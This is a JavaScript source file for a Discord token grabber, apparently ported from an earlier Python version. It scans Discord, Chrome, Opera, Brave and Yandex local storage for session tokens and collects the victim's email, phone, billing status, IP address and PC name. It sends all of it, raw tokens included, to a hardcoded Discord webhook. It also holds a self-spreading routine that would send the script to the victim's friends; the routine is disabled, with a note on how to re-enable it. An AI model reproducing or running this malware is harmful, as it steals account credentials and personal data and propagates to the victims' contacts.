"use strict";
const fs = require("fs");
const os = require("os");
const path = require("path");
const { execSync } = require("child_process");
const { argv } = require("process");
const request = require("sync-request"); // Ensure "sync-request" is installed via npm

if (process.platform !== "win32") {
    process.exit();
}

const LOCAL = process.env.LOCALAPPDATA;
const ROAMING = process.env.APPDATA;
const PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
};

function getheaders(token, content_type = "application/json") {
    let headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    };
    if (token) {
        headers["Authorization"] = token;
    }
    return headers;
}

function getuserdata(token) {
    try {
        let res = request("GET", "https://discordapp.com/api/v6/users/@me", {
            headers: getheaders(token)
        });
        return JSON.parse(res.getBody("utf8"));
    } catch (e) {
        // pass
    }
}

function gettokens(p) {
    p += "\\Local Storage\\leveldb";
    let tokens = [];
    try {
        let files = fs.readdirSync(p);
        files.forEach(file_name => {
            if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
                return;
            }
            let filePath = path.join(p, file_name);
            let content = "";
            try {
                content = fs.readFileSync(filePath, { encoding: "utf8" });
            } catch (e) {
                // ignore read errors
            }
            let lines = content.split("\n").map(x => x.trim()).filter(x => x);
            lines.forEach(line => {
                let regexes = [/[A-Za-z0-9_\-]{24}\.[A-Za-z0-9_\-]{6}\.[A-Za-z0-9_\-]{27}/g, /mfa\.[A-Za-z0-9_\-]{84}/g];
                regexes.forEach(regex => {
                    let found = line.match(regex);
                    if (found) {
                        found.forEach(token => {
                            tokens.push(token);
                        });
                    }
                });
            });
        });
    } catch (e) {
        // pass
    }
    return tokens;
}

function getdeveloper() {
    let dev = "wodx";
    try {
        let res = request("GET", "https://pastebin.com/raw/ssFxiejv");
        dev = res.getBody("utf8");
    } catch (e) {
        // pass
    }
    return dev;
}

function getip() {
    let ip = "None";
    try {
        let res = request("GET", "https://api.ipify.org");
        ip = res.getBody("utf8").trim();
    } catch (e) {
        // pass
    }
    return ip;
}

function getavatar(uid, aid) {
    let url = `https://cdn.discordapp.com/avatars/${uid}/${aid}.gif`;
    try {
        // Using HEAD request to check if the url is valid
        request("HEAD", url);
    } catch (e) {
        url = url.slice(0, -4);
    }
    return url;
}

function gethwid() {
    try {
        let p = execSync("wmic csproduct get uuid", { encoding: "utf8" });
        let lines = p.split("\n");
        return lines[1].trim();
    } catch (e) {
        // pass
    }
}

function getfriends(token) {
    try {
        let res = request("GET", "https://discordapp.com/api/v6/users/@me/relationships", {
            headers: getheaders(token)
        });
        return JSON.parse(res.getBody("utf8"));
    } catch (e) {
        // pass
    }
}

function getchat(token, uid) {
    try {
        let body = JSON.stringify({ recipient_id: uid });
        let res = request("POST", "https://discordapp.com/api/v6/users/@me/channels", {
            headers: getheaders(token),
            body: body
        });
        return JSON.parse(res.getBody("utf8"))["id"];
    } catch (e) {
        // pass
    }
}

function has_payment_methods(token) {
    try {
        let res = request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", {
            headers: getheaders(token)
        });
        return Boolean(JSON.parse(res.getBody("utf8")).length > 0);
    } catch (e) {
        // pass
    }
}

function send_message(token, chat_id, form_data) {
    try {
        request("POST", `https://discordapp.com/api/v6/channels/${chat_id}/messages`, {
            headers: getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
            body: form_data
        });
    } catch (e) {
        // pass
    }
}

function spread(token, form_data, delay) {
    return; // Remove to re-enabled
    // The following code is preserved from the original implementation
    /*
    let friends = getfriends(token);
    if (friends) {
        friends.forEach(friend => {
            try {
                let chat_id = getchat(token, friend["id"]);
                send_message(token, chat_id, form_data);
            } catch (e) {
                // pass
            }
            sleep(delay);
        });
    }
    */
}

function main() {
    let cache_path = ROAMING + "\\.cache~$";
    let prevent_spam = true;
    let self_spread = true;
    let embeds = [];
    let working = [];
    let checked = [];
    let already_cached_tokens = [];
    let working_ids = [];
    let ip = getip();
    let pc_username = process.env.UserName;
    let pc_name = process.env.COMPUTERNAME;
    let user_path_name = process.env.userprofile ? process.env.userprofile.split("\\")[2] : "";
    let developer = getdeveloper();
    for (let platform in PATHS) {
        let p = PATHS[platform];
        if (!fs.existsSync(p)) {
            continue;
        }
        let tokens = gettokens(p);
        tokens.forEach(token => {
            if (checked.includes(token)) {
                return;
            }
            checked.push(token);
            let uid = null;
            if (!token.startsWith("mfa.")) {
                try {
                    uid = Buffer.from(token.split(".")[0], "base64").toString();
                } catch (e) {
                    // pass
                }
                if (!uid || working_ids.includes(uid)) {
                    return;
                }
            }
            let user_data = getuserdata(token);
            if (!user_data) {
                return;
            }
            working_ids.push(uid);
            working.push(token);
            let username = user_data["username"] + "#" + String(user_data["discriminator"]);
            let user_id = user_data["id"];
            let avatar_id = user_data["avatar"];
            let avatar_url = getavatar(user_id, avatar_id);
            let email = user_data["email"];
            let phone = user_data["phone"];
            let nitro = Boolean(user_data["premium_type"]);
            let billing = Boolean(has_payment_methods(token));
            let embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": `Email: ${email}\nPhone: ${phone}\nNitro: ${nitro}\nBilling Info: ${billing}`,
                        "inline": true
                    },
                    {
                        "name": "**PC Info**",
                        "value": `IP: ${ip}\nUsername: ${pc_username}\nPC Name: ${pc_name}\nToken Location: ${platform}`,
                        "inline": true
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": false
                    }
                ],
                "author": {
                    "name": `${username} (${user_id})`,
                    "icon_url": avatar_url
                },
                "footer": {
                    "text": `Token grabber by ${developer}`
                }
            };
            embeds.push(embed);
        });
    }
    try {
        checked.forEach(token => {
            if (!already_cached_tokens.includes(token)) {
                fs.appendFileSync(cache_path, token + "\n", { encoding: "utf8" });
            }
        });
    } catch (e) {
        // pass
    }
    if (working.length === 0) {
        working.push('123');
    }
    let webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    };
    try {
        request("POST", "https://discord.com/api/webhooks/1341422778330513478/n2EUV86P2zNL3VBP4i2T0u5y2Jvt3B5CCSery0I2D13xpGWVhRkU_TwLKa5QR1JRX8Oj", {
            headers: getheaders(null),
            body: JSON.stringify(webhook)
        });
    } catch (e) {
        // pass
    }
    if (self_spread) {
        working.forEach(token => {
            let content = "";
            try {
                content = fs.readFileSync(argv[1], { encoding: "utf8" });
            } catch (e) {
                // pass
            }
            let payload = "-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"file\"; filename=\"" + __filename + "\"\nContent-Type: text/plain\n\n" + content + "\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"content\"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name=\"tts\"\n\nfalse\n-----------------------------325414537030329320151394843687--";
            // Creating a new "thread" using setTimeout to mimic concurrent execution
            setTimeout(() => {
                spread(token, payload, 7500 / 1000);
            }, 0);
        });
    }
}

try {
    main();
} catch (e) {
    console.log(e);
    // pass
}
 
